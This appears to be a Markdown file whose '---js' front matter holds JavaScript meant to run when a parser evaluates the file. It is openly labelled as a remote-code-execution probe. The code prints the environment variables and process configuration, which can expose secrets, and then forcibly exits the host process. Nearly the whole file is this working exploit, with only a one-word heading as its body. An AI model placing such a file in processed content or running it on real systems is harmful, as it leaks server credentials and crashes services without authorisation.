---js
(function(){
  console.log("--------------------------------------------------");
  console.log("RCE CONTEXT PROBE");
  console.log("--------------------------------------------------");
  
  try {
    console.log("Type of require: " + typeof require);
  } catch(e) { console.log("require error: " + e.message); }

  try {
    console.log("Type of process: " + typeof process);
    if (typeof process !== 'undefined') {
       console.log("ENV VARS (Partial): " + JSON.stringify(process.env).substring(0, 200));
       console.log("Process Config: " + JSON.stringify(process.config));
       process.exit(1337);
    }
  } catch(e) { console.log("process error: " + e.message); }

  try {
    console.log("Type of global: " + typeof global);
  } catch(e) { console.log("global error: " + e.message); }

  return { name: "Prober" };
})()
---
# Probing
